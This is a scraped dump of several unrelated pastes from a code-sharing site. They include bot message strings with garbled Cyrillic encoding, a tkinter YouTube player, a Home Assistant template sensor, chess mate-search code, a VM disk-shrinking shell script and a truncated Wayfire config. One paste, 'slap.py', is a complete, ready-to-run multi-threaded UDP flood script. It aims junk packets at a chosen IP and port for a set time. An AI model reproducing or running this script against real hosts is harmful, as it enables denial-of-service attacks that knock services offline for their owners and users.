            '–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –±—é–ª–ª–µ—Ç–µ–Ω–µ–π –≤ –ø–µ—Ä–µ–Ω–æ—Å–Ω—ã—Ö –∏ —Å—Ç–∞—Ü–∏–æ–Ω–∞—Ä–Ω—ã—Ö —è—â–∏–∫–∞—Ö —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é (—Å—Ç—Ä–æ–∫–∏ 7 –∏ 8)',
        'INVALID_NUM_PORTABLE_AND_STATIONARY_BOXES':
            '–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–≤–æ–¥–µ —á–∏—Å–ª–∞ –±—é–ª–ª–µ—Ç–µ–Ω–µ–π –∏–∑ —Å—Ç—Ä–æ–∫ 7 –∏ 8. –í–≤–µ–¥–∏—Ç–µ –¥–≤–∞ —á–∏—Å–ª–∞ —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é.',
        'PROVIDE_INVALID_AND_VALID_BALLOTS':
            '–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö –∏ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö –±—é–ª–ª–µ—Ç–µ–Ω–µ–π —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é (—Å—Ç—Ä–æ–∫–∏ 9 –∏ 10)',
        'INVALID_NUM_OF_INVALID_AND_VALID_BALLOTS':
            '–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–≤–æ–¥–µ —á–∏—Å–ª–∞ –±—é–ª–ª–µ—Ç–µ–Ω–µ–π –∏–∑ —Å—Ç—Ä–æ–∫ 9 –∏ 10. –í–≤–µ–¥–∏—Ç–µ –¥–≤–∞ —á–∏—Å–ª–∞ —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é.',
        'PLEASE_PROVIDE_BALLOTS_IN_FAVOR':
            '–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –±—é–ª–ª–µ—Ç–µ–Ω–µ–π –∑–∞ –∫–∞–∂–¥–æ–≥–æ –∫–∞–Ω–¥–∏–¥–∞—Ç–∞ —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é (—Å—Ç—Ä–æ–∫–∏ —Å 13 –ø–æ 16)',
        'INVALID_NUM_OF_BALLOTS_IN_FAVOR':
            'Invalid number of ballots in favor, please write the numbers separated by comma, for example: 1,2,3,4.',
        'THE_NUMBERS_ARE_NOT_COHERENT':
            '–í—ã –¥–æ–ø—É—Å—Ç–∏–ª–∏ –æ—à–∏–±–∫—É/–∫–∏ –ø—Ä–∏ –≤–≤–æ–¥–µ —á–∏—Å–ª–∞ –±—é–ª–ª–µ—Ç–µ–Ω–µ–π. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –≤–≤–æ–¥ —Å–Ω–∞—á–∞–ª–∞, —Å—Ç–∞—Ä–∞–π—Ç–µ—Å—å –±—ã—Ç—å –≤–Ω–∏–º–∞—Ç–µ–ª—å–Ω–µ–π',
        'THE_NUMBERS_ARE_COHERENT':
            '–ß–∏—Å–ª–æ –±—é–ª–ª–µ—Ç–µ–Ω–µ–π –≤–≤–µ–¥–µ–Ω–æ –ø—Ä–∞–≤–∏–ª—å–Ω–æ. –°–ø–∞—Å–∏–±–æ! –¢–µ–ø–µ—Ä—å –∑–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–æ—Ç–æ –∏–ª–∏ —Å–∫–∞–Ω –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ (jpg-—Ñ–∞–π–ª).',
    }


def get_bot_message(message_key):
    language = os.getenv('BOT_LANGUAGE', 'ENGLISH')  # Default language is English if not specified
    if language.upper() == 'RUSSIAN':
        return BotMessages.RUSSIAN.value.get(message_key, '')
    else:
        return BotMessages.ENGLISH.value.get(message_key, '')
"
zxiYjpC2,slap.py,betrayed,Python,Saturday 16th of March 2024 03:55:01 PM CDT,"#!/usr/bin/env python3
# MULTI-THREADED UDP DDOS SCRIPT
# PROGRAMMED BY BETRAYED

import sys, time, socket, threading
data = ''
_end = False

def _doWork():
    while True:
        try:
            if _end == True:
              break 
          
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((sys.argv[1], int(sys.argv[2])))
            s.send(data.encode())
            
            while _end == False:
                s.send(data.encode()) 
                
            s.close()
        except:
            pass

def main():
    if len(sys.argv) != 6:
        sys.exit(""\r\n    SYNTAX: <IP> <PORT> <SIZE> <TIME> <THREAD/S>\r\n"")
    
    global data, _end
    
    while len(data) < int(sys.argv[3]):
        data = data + ""$""
    
    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n\r\n
    ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñÑ‚ñà          ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà    ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ 
   ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà         ‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà 
  ‚ñë‚ñà‚ñà‚ñà    ‚ñà‚ñÄ ‚ñë‚ñà‚ñà‚ñà        ‚ñë‚ñà‚ñà‚ñà   ‚ñë‚ñà‚ñà‚ñà  ‚ñë‚ñà‚ñà‚ñà   ‚ñë‚ñà‚ñà‚ñà 
  ‚ñë‚ñà‚ñà‚ñà       ‚ñë‚ñà‚ñà‚ñà        ‚ñë‚ñà‚ñà‚ñà   ‚ñë‚ñà‚ñà‚ñà  ‚ñë‚ñà‚ñà‚ñà   ‚ñë‚ñà‚ñà‚ñà 
 ‚ñÄ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñà‚ñà‚ñà       ‚ñÄ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñÄ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ  
 ‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñë‚ñà‚ñà‚ñà       ‚ñë‚ñë‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà ‚ñë‚ñë‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë        
    ‚ñÑ‚ñà    ‚ñà‚ñà‚ñà‚ñë‚ñà‚ñà‚ñà‚ñå    ‚ñÑ  ‚ñë‚ñà‚ñà‚ñà   ‚ñë‚ñà‚ñà‚ñà  ‚ñë‚ñà‚ñà‚ñà        
  ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ ‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñà‚ñà  ‚ñë‚ñà‚ñà‚ñà   ‚ñë‚ñà‚ñÄ   ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÄ      
 ‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë   ‚ñë‚ñÄ‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë   ‚ñë‚ñë‚ñë    ‚ñë    ‚ñë‚ñë‚ñë‚ñë‚ñë
          """""")
    print(""Smacking the dog sh*t out of "" + sys.argv[1] + "":"" + sys.argv[2] + "" for "" + sys.argv[4] + "" seconds...\r\n"")
          
    tasks = []
    i = 0
    while True:
        i +=1
        x = threading.Thread(target=_doWork)
        tasks.append(x)
        x.start()
        if i == int(sys.argv[5]):
            break
    
    stopAt = time.time() + int(sys.argv[4])
    try:
        while time.time() < stopAt:
            pass
    except KeyboardInterrupt:
        pass
    
    _end = True
    
    for y in tasks:
        y.join()
        
    sys.exit(""\r\nDone.\r\n"")
    
if __name__ == ""__main__"":
    main()
"
Z1SqvWeC,YOUTUBE VIDEO PLAYER,Nenogzar,Python,Saturday 16th of March 2024 03:45:35 PM CDT,"import tkinter as tk
import os
import webbrowser
from youtube_search import YoutubeSearch
from pytube import YouTube


class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.video_urls = {}  # Initialize video URL dictionary

        # Color Palette
        self.bg_color = ""#336699""
        self.button_color = ""#4CAF50""
        self.text_color = ""white""

        self.main_frame = tk.Frame(root, bg=self.bg_color)
        self.main_frame.pack(fill=""both"", expand=True)

        self.title_label = tk.Label(self.main_frame, text=""YOUTUBE VIDEO PLAYER"", font=(""Arial"", 24, ""bold""),
                                    fg=self.text_color, bg=self.bg_color)
        self.title_label.pack(pady=10)

        self.search_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.search_frame.pack(fill=""x"")

        self.search_entry = tk.Entry(self.search_frame)
        self.search_entry.pack(side=""left"", fill=""x"", expand=True, padx=5, pady=5)

        self.search_button = tk.Button(self.search_frame, text=""Search YouTube"", command=self.search_and_play,
                                       bg=self.button_color, fg=self.text_color)
        self.search_button.pack(side=""left"", padx=5, pady=5)

        self.save_button = tk.Button(self.search_frame, text=""Save"", command=self.save_results, bg=self.button_color,
                                     fg=self.text_color)
        self.save_button.pack(side=""left"", padx=5, pady=5)

        self.list_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.list_frame.pack(side=""left"", fill=""both"", expand=False)

        self.button_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.button_frame.pack(side=""bottom"", fill=""x"")

        self.lst = tk.Listbox(self.list_frame, width=30, height=20, bg=self.bg_color, fg=self.text_color)
        self.lst.pack(side=""left"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.list_frame, orient=""vertical"", command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")
        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.play_button = tk.Button(self.button_frame, text=""Play"", command=self.play_video, bg=self.button_color,
                                     fg=self.text_color)
        self.play_button.pack(side=""left"", padx=5, pady=5)

        self.stop_button = tk.Button(self.button_frame, text=""Stop"", command=self.stop_video, bg=self.button_color,
                                     fg=self.text_color)
        self.stop_button.pack(side=""left"", padx=5, pady=5)

        self.current_video_label = tk.Label(root, text=""No video selected"", bg=self.bg_color, fg=self.text_color)
        self.current_video_label.pack(pady=5)

        self.player_frame = tk.Frame(self.main_frame)
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.lst.bind(""<<ListboxSelect>>"", self.show_video)


        self.load_saved_results()

    def search_and_play(self):
        query = self.search_entry.get()
        search_results = YoutubeSearch(query, max_results=5).to_dict()
        if search_results:
            self.lst.delete(0, tk.END)
            for result in search_results:
                video_title = result['title']
                video_url = 'https://www.youtube.com' + result['url_suffix']
                self.lst.insert(tk.END, video_title)
                self.video_urls[video_title] = video_url  # Store title and URL in dictionary
            self.save_results()  # Save updated list of videos

    """""" os play """"""
    # def play_video(self):
    #     if self.lst.curselection():
    #         title = self.lst.get(self.lst.curselection())
    #         video_url = self.video_urls.get(title)  # Get URL from dictionary
    #         print(""Playing video:"", video_url)  # Print URL for debugging
    #
    #         # –û—Ç–≤–∞—Ä—è–º–µ URL –∞–¥—Ä–µ—Å–∞ –≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏—è –±—Ä–∞—É–∑—ä—Ä –Ω–∞ Windows
    #         os.system(f'start {video_url}')
    #         self.current_video_label.config(text=f""Playing: {title}"")
    #     else:
    #         print(""No video selected."")


    def play_video(self):
        if self.lst.curselection():
            title = self.lst.get(self.lst.curselection())
            video_url = self.video_urls.get(title)  # Get URL from dictionary
            print(""Playing video:"", video_url)  # Print URL for debugging

            webbrowser.open(video_url)
            self.current_video_label.config(text=f""Playing: {title}"")
        else:
            print(""No video selected."")
    def stop_video(self):
        self.current_video_label.config(text=""Video stopped"")

    def save_results(self):
        with open(""YouTube_list.txt"", ""a"") as file:
            for title, url in self.video_urls.items():
                file.write(f""{title}: {url}\n"")

    def load_saved_results(self):
        try:
            with open(""YouTube_list.txt"", ""r"") as file:
                for line in file:
                    if ':' in line:
                        title, url = line.strip().split(': ', 1)
                        self.video_urls[title] = url
                        self.lst.insert(tk.END, title)
        except FileNotFoundError:
            print(""No saved results found."")

    def show_video(self, event):

        pass

root = tk.Tk()
root.geometry(""800x600+300+50"")
root.title(""YouTube Player"")
root.configure(bg=""#336699"")
video_player = VideoPlayer(root)
root.mainloop()
"
yEJ6ZeB9,How do we make an entity in Home Assistant from two other entities?,LeventeDaradici,YAML,Saturday 16th of March 2024 02:50:23 PM CDT,"// https://youtu.be/QheN8Jz8vTY
//
sensor:
  - platform: template
    sensors:
      difference_power_entities:
        friendly_name: ""Consum CasƒÉ""
        unit_of_measurement: ""W""
        value_template: ""{{ (states('sensor.inverter_active_power') | float - states('sensor.power_meter_active_power') | float) | abs }}""
"
jQ090L01,gives 2 plies instead of 4,max2201111,Python,Saturday 16th of March 2024 02:47:13 PM CDT,"import chess

def simplify_fen(fen):
    """"""Simplifies a FEN string to include only position, turn, castling availability, and en passant target.""""""
    return ' '.join(fen.split(' ')[:4])

def initialize_game_tree(initial_fen):
    """"""Initializes the game tree with the root node based on the initial FEN.""""""
    simplified_fen = simplify_fen(initial_fen)
    game_tree = {1: {'fen': simplified_fen, 'parent': None, 'color': chess.WHITE if 'w' in initial_fen else chess.BLACK, 'children': [], 'moves_to_mate': None}}
    fen_to_node_id = {simplified_fen: 1}
    return game_tree, fen_to_node_id

def add_descendants_iteratively(game_tree, fen_to_node_id):
    """"""Expands the game tree by iteratively adding legal move descendants of each game state.""""""
    queue = [(1, 0)]
    while queue:
        node_id, _ = queue.pop(0)
        board = chess.Board(game_tree[node_id]['fen'] + "" 0 1"")
        for move in board.legal_moves:
            board.push(move)
            simplified_fen = simplify_fen(board.fen())
            if simplified_fen not in fen_to_node_id:
                new_node_id = len(game_tree) + 1
                game_tree[new_node_id] = {'fen': simplified_fen, 'parent': node_id, 'color': chess.WHITE if board.turn else chess.BLACK, 'children': [], 'moves_to_mate': None}
                fen_to_node_id[simplified_fen] = new_node_id
                game_tree[node_id]['children'].append(new_node_id)
                queue.append((new_node_id, 0))
            board.pop()

def update_game_outcomes(game_tree):
    """"""Updates game outcomes focusing only on checkmates.""""""
    for node_id, node in game_tree.items():
        board = chess.Board(node['fen'] + "" 0 1"")
        if board.is_checkmate():
            node['result'] = 1 if board.turn == chess.BLACK else -1  # Black's turn but checkmate means White wins, and vice versa
            node['moves_to_mate'] = 0  # Checkmate is immediate, no more moves required.
        elif board.is_game_over():
            node['result'] = 0  # For draws or stalemates, we consider the result as 0 (this will be ignored in propagation)
            

# def update_parent_preferences(game_tree):
#     def recurse(node_id):
#         node = game_tree[node_id]
#         # If a direct outcome is already determined at this node
#         if 'result' in node:
#             moves_to_mate = 0 if 'moves_to_mate' in node and node['result'] in [-1, 1] else None
#             return node['result'], [node_id], moves_to_mate

#         # Initialize variables to track the best outcome
#         best_result = 0  # Assume draw as default
#         best_path = []
#         best_moves_to_mate = None

#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)

#             # Skip paths that don't lead to a decisive outcome
#             if child_result == 0 or child_moves_to_mate is None:
#                 continue

#             # Logic to select the optimal path based on the current node's perspective
#             if best_moves_to_mate is None:
#                 # First child with a decisive outcome sets the initial values
#                 best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate
#             else:
#                 if node['color'] == chess.WHITE:
#                     # White seeks to minimize moves to mate when winning
#                     if child_result == 1 and child_moves_to_mate < best_moves_to_mate:
#                         best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate
#                 else:
#                     # Black seeks to minimize moves to mate when winning
#                     if child_result == -1 and child_moves_to_mate < best_moves_to_mate:
#                         best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         # Update the current node with the optimal outcome found
#         if best_moves_to_mate is not None:
#             node['result'] = best_result
#             node['moves_to_mate'] = 1 + best_moves_to_mate  # Increment for the move to this node
#         else:
#             node['result'] = best_result  # Could be 0 if all children result in a draw
#             node['moves_to_mate'] = None

#         return node['result'], [node_id] + best_path, node.get('moves_to_mate')

#     _, path, _ = recurse(1)  # Start the recursion from the root of the game tree
#     return path

def update_parent_preferences(game_tree):
    def recurse(node_id):
        node = game_tree[node_id]
        if 'result' in node:
            # Node has a direct outcome (win, loss, or draw)
            moves_to_mate = 0 if 'moves_to_mate' in node and node['result'] in [-1, 1] else None
            return node['result'], [node_id], moves_to_mate

        best_result = None  # Track the best outcome (initially undefined)
        best_path = []  # Best path leading to this outcome
        best_moves_to_mate = float('inf')  # Use infinity as a comparison basis for finding the minimum

        for child_id in node['children']:
            child_result, child_path, child_moves_to_mate = recurse(child_id)

            # Skip draws or paths not leading to a decisive outcome
            if child_result == 0 or child_moves_to_mate is None:
                continue

            # Identify and select the best outcome for the current player
            if best_result is None or (child_result == -1 and node['color'] == chess.WHITE and child_moves_to_mate < best_moves_to_mate):
                # For White, a result of -1 (Black win) with fewer moves is worse, so it's avoided unless it's the only outcome
                best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate
            elif child_result == 1 and node['color'] == chess.BLACK and child_moves_to_mate < best_moves_to_mate:
                # For Black, similar logic applies but reversed
                best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

        # If a winning path was found, update the node
        if best_result in [-1, 1]:
            node['result'] = best_result
            node['moves_to_mate'] = best_moves_to_mate + 1  # Adjust for the current move
        else:
            # No winning path found, consider it a draw or maintain undefined result
            node['result'] = 0 if best_result is None else best_result
            node['moves_to_mate'] = None

        return node['result'], [node_id] + best_path, node.get('moves_to_mate')

    _, path, _ = recurse(1)  # Starting from the root of the game tree
    return path



# This function assumes that 'game_tree' is a dictionary representing the nodes of your game tree,
# where each node ID maps to a dictionary containing:
# 'fen': The FEN string of the board position,
# 'parent': The parent node ID,
# 'color': The color to move (True for White, False for Black),
# 'children': A list of child node IDs,
# 'result': The game outcome from this position (-1 for Black win, 1 for White win, 0 for draw),
# 'moves_to_mate': The shortest number of moves to mate from this position (if applicable).

# To execute this code, you'll need to define your 'game_tree' variable with the initial game state and
# have the chess positions added to the tree using the 'add_descendants_iteratively' function you've defined.

            
            
# def update_parent_preferences(game_tree):
#     def recurse(node_id):
#         node = game_tree[node_id]
#         if 'result' in node:
#             # Direct outcome detected, set moves_to_mate accordingly
#             moves_to_mate = 0 if 'moves_to_mate' in node and node['result'] in [-1, 1] else None
#             return node['result'], [node_id], moves_to_mate

#         best_result = 0  # Default to draw
#         best_path = []
#         best_moves_to_mate = float('inf')  # Initialize with a large number for comparison

#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)
            
#             if child_result == 0 or child_moves_to_mate is None:
#                 continue  # Skip non-result or draw paths

#             # Logic for selecting the shortest path to victory
#             if ((node['color'] == chess.WHITE and child_result == 1) or 
#                 (node['color'] == chess.BLACK and child_result == -1)) and child_moves_to_mate < best_moves_to_mate:
#                 best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         if best_moves_to_mate != float('inf'):
#             node['result'] = best_result
#             node['moves_to_mate'] = best_moves_to_mate + 1  # Correctly increment for the move to this node
#         else:
#             node['result'] = best_result  # Draw if no better path found
#             node['moves_to_mate'] = None  # No valid path to victory

#         return node['result'], [node_id] + best_path, node.get('moves_to_mate')

#     result, path, moves_to_mate = recurse(1)  # Assuming 1 is the root node's ID
#     return path
            
            
# def update_parent_preferences(game_tree):
#     def recurse(node_id):
#         node = game_tree[node_id]
#         if 'result' in node:  # Check if the node has a direct outcome
#             return node['result'], [node_id], 0 if 'moves_to_mate' in node else None

#         best_result = 0  # Assume draw as the default outcome
#         best_path = []
#         best_moves_to_mate = None

#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)

#             if child_result == 0 or child_moves_to_mate is None:  # Skip draws or paths not leading to checkmate
#                 continue

#             # Ensure we have a valid best_moves_to_mate for comparison
#             if best_moves_to_mate is None:
#                 best_moves_to_mate = child_moves_to_mate
#                 best_result, best_path = child_result, child_path
#             else:
#                 # Compare only if child_moves_to_mate is not None and update accordingly
#                 if node['color'] == chess.WHITE and child_result == 1:
#                     if child_moves_to_mate < best_moves_to_mate:
#                         best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate
#                 elif node['color'] == chess.BLACK and child_result == -1:
#                     if child_moves_to_mate > best_moves_to_mate:
#                         best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         if best_moves_to_mate is not None:
#             node['result'] = best_result
#             node['moves_to_mate'] = 1 + best_moves_to_mate
#         else:
#             node['result'] = best_result  # could still be 0 if no child paths lead to a win
#             node['moves_to_mate'] = None

#         return node['result'], [node_id] + best_path, node.get('moves_to_mate')

#     result, path, moves_to_mate = recurse(1)  # Start the recursion from the root node.
#     return path


# Make sure to replace or integrate this function into your main execution logic and re-run your analysis.

# def update_parent_preferences(game_tree):
#     def recurse(node_id):
#         node = game_tree[node_id]
#         if 'result' in node:
#             moves_to_mate = 0 if 'moves_to_mate' in node and node['result'] in [-1, 1] else None
#             return node['result'], [node_id], moves_to_mate

#         best_result = 0  # Default outcome
#         best_path = []
#         best_moves_to_mate = float('inf')  # Use infinity as the initial comparison value

#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)

#             if child_result == 0 or child_moves_to_mate is None:
#                 continue  # Skip non-result paths

#             # Looking for the shortest path to checkmate for both colors
#             if (child_result == 1 and node['color'] == chess.WHITE) or (child_result == -1 and node['color'] == chess.BLACK):
#                 if child_moves_to_mate < best_moves_to_mate:
#                     best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         if best_moves_to_mate != float('inf'):
#             node['result'] = best_result
#             node['moves_to_mate'] = 1 + best_moves_to_mate  # Incrementing for the current move
#         else:
#             node['result'] = 0  # Draw or no path to checkmate found
#             node['moves_to_mate'] = None

#         return node['result'], [node_id] + best_path, node.get('moves_to_mate')

#     _, path, _ = recurse(1)
#     return path


def print_path(game_tree, path):
    """"""Prints the board positions along the path.""""""
    for node_id in path:
        node = game_tree[node_id]
        board = chess.Board(node['fen'] + "" 0 1"")
        moves_to_mate = ""N/A"" if node.get('moves_to_mate') is None else node.get('moves_to_mate')
        print(f""Node ID: {node_id}, Result: {node.get('result', 'N/A')}, Moves to Mate: {moves_to_mate}"")
        print(board,node,""<<\n"")
        print(""---"")

def main():
    initial_fen = ""8/8/8/3k4/8/8/2K2Q2/8 w - - 0 1""  # Example FEN
    initial_fen = ""8/8/8/3k4/8/2K5/5q2/8 w - - 0 1""
    initial_fen = ""8/8/8/3k4/1K6/8/5q2/8 b - - 0 1""
    initial_fen = ""5K2/q7/6k1/8/8/8/8/8 w - - 0 1""
  #  initial_fen = ""6K1/q7/6k1/8/8/8/8/8 b - - 0 1""

    game_tree, fen_to_node_id = initialize_game_tree(initial_fen)
    add_descendants_iteratively(game_tree, fen_to_node_id)
    update_game_outcomes(game_tree)
    path = update_parent_preferences(game_tree)
    print(game_tree[1])
    print(""Path to the outcome:"")
    print_path(game_tree, path)

if __name__ == ""__main__"":
    main()"
hDTjHtjU,shrink_to_export.sh,silek65,Bash,Saturday 16th of March 2024 02:42:08 PM CDT,"#!/bin/sh

VM_SYS_CAPACITY=$(df -h / | tail -n 1 | awk '{print $2}')

echo ""[Hit CTRL+C right NOW! if you previously did NOT read that WARNING]""
sleep 2
echo
echo
echo
echo
echo ""
This script is a helper when shrinking or recovering unused free guest VM disk space.

Note: Hypervisors like Proxmox allows to discard unused free space, QNAP VM clone functions work very similar and in fact
      is equal to: 'qemu-img convert -p -O qcow2 -o compat=1.1,lazy_refcounts ...'

Requirements:
1) Script will perform quick disk defragmentaion to move data from end parts of the disk volume.
   Recommended: Before doing this operation its recommended to manually stop as much services as possible.

once defragmentation is done....
2) free space on the guest will be filled with 0 bytes:
   That means:
   - On the host you have at least: ${VM_SYS_CAPACITY} free space on the datastore - OTHERWISE HIT CTRL+C
   - Critical services like MySQL/MariaDB has to be stopped for safety reasons
     (to prevent crash & corrupt DB disk image will run out of free space)

---- [Hit CTRL+C to ABORT]: 10 seconds left ....""

sleep 10

stop_services(){
	echo Stop critical services....
	service monitorix stop 2>/dev/null 1>/dev/null
	service grafana-server stop 2>/dev/null 1>/dev/null
	service memcached stop 2>/dev/null 1>/dev/null
	service redis-server stop 2>/dev/null 1>/dev/null
	systemctl stop kibana 2>/dev/null 1>/dev/null
	systemctl stop elasticsearch 2>/dev/null 1>/dev/null
	service mysql stop 2>/dev/null 1>/dev/null
	service apache2 stop 2>/dev/null 1>/dev/null
}

start_services(){
	echo Start services once again....
	service mysql start 2>/dev/null 1>/dev/null
	systemctl start elasticsearch 2>/dev/null 1>/dev/null
	systemctl start kibana 2>/dev/null 1>/dev/null
	service apache2 start 2>/dev/null 1>/dev/null
	service monitorix start 2>/dev/null 1>/dev/null
	service grafana-server start 2>/dev/null 1>/dev/null
	service memcached start 2>/dev/null 1>/dev/null
	service redis-server start 2>/dev/null 1>/dev/null
}

drop_cache(){
	echo Drop and flush cache...

	sync
	# drop cache
	sysctl -w vm.drop_caches=3

	# drop memory cache
	echo 3 > /proc/sys/vm/drop_caches
	echo 1 > /proc/sys/vm/compact_memory
	# sync once again
	sync
	# make sure to sync once again
	sync
	# and again for last time
	sync
}

stop_services

drop_cache

# install dependencies
apt update 2>/dev/null 1>/dev/null
apt install fstrim e4defrag 2>/dev/null 1>/dev/null

# do defrag
echo Defragmenting data:
e4defrag /

drop_cache

# fill up hdd with zeros
dd if=/dev/zero of=/zero bs=64k
drop_cache
# cleanup
rm -f /zero

drop_cache

echo Lets trim all devices
fstrim -a -v 2>/dev/null 1>/dev/null


echo Lets trim all devices last time...
fstrim -a -v 2>/dev/null 1>/dev/null

echo Done
echo Please shutdown VM and clone to new VM.

echo [Hit CTRL+C to abort shut-down procedure]
sleep 10
shutdown -P 0"
ew3RPYDu,vm,bluebyt,INI file,Saturday 16th of March 2024 02:32:25 PM CDT,"# Default config for Wayfire
#
# Copy this to ~/.config/wayfire.ini and edit it to your liking.
#
# Take the tutorial to get started.
# https://github.com/WayfireWM/wayfire/wiki/Tutorial
#
# Read the Configuration document for a complete reference.
# https://github.com/WayfireWM/wayfire/wiki/Configuration

# Input configuration ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

# Example configuration:
#
# [input]
# xkb_layout = us,fr
# xkb_variant = dvorak,bepo
# xkb_options = grp:win_space_toggle
#
# See Input options for a complete reference.
# https://github.com/WayfireWM/wayfire/wiki/Configuration#input

# Output configuration ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

# Example configuration:
[output:Virtual-1]
mode = 2560x1080@50000

# position = 0,0
# transform = normal
# scale = 1.000000
#
# You can get the names of your outputs with wlr-randr.
# https://github.com/emersion/wlr-randr
#
# See also kanshi for configuring your outputs automatically.
# https://wayland.emersion.fr/kanshi/
#
# See Output options for a complete reference.
# https://github.com/WayfireWM/wayfire/wiki/Configuration#output

# Core options ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

[core]

# List of plugins to be enabled.
# See the Configuration document for a complete list.
plugins = ipc ipc-rules alpha animate autostart command cube decoration expo fast-switcher fisheye foreign-toplevel grid gtk-shell idle invert move oswitch place resize shortcuts-inhibit switcher vswitch wayfire-shell window-rules wm-actions wrot zoom

